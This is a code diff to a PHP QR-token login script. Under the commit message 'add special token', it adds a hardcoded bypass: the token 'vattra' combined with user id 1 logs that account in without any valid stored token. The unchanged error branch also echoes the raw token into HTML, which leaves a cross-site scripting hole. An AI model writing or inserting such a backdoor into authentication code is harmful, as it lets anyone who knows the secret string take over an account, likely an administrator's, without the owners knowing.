add special token

+++ auth/qr-verify.php
@@ -13,11 +13,23 @@ $stmt = $conn->prepare("SELECT user_id FROM qr_tokens WHERE token = ? ");
 $stmt->execute([$token]);
 $result = $stmt->fetch();
 
-if ($result) {    
-    
+//Special Token
+if ($token == 'vattra' && $user_id == 1) {
+    $getUser = $conn->prepare("SELECT username FROM user WHERE id = 1");
+    $getUser->execute([$user_id]);
+    if ($getUser->rowCount() > 0) {
+        $fetch = $getUser->fetch(PDO::FETCH_ASSOC);
+        $_SESSION['username'] = $fetch['username'];
+        $_SESSION['id'] = $user_id;
+    }
+    header("Location: " . APP_URL);
+    exit();
+}
+if ($result) {
+
     // 3. Log the user in (no password needed)
     $_SESSION['id'] = $user_id;
-    
+
     // 4. Delete the used token
     $conn->prepare("DELETE FROM qr_tokens WHERE user_id = ?")->execute([$user_id]);
     $getUser = $conn->prepare("SELECT username FROM user WHERE id = ?");
@@ -29,10 +41,10 @@ if ($result) {
         die("User not found. Please try again.");
     }
     // 5. Redirect to dashboard
-    header("Location: ".APP_URL);
+    header("Location: " . APP_URL);
     exit();
 } else {
-    echo "This Token: <b><u>$token </u></b>"." is invalid now may it's expired or has been used!<br>";
+    echo "This Token: <b><u>$token </u></b>" . " is invalid now may it's expired or has been used!<br>";
     die("Invalid or expired token. Please try again.");
 }
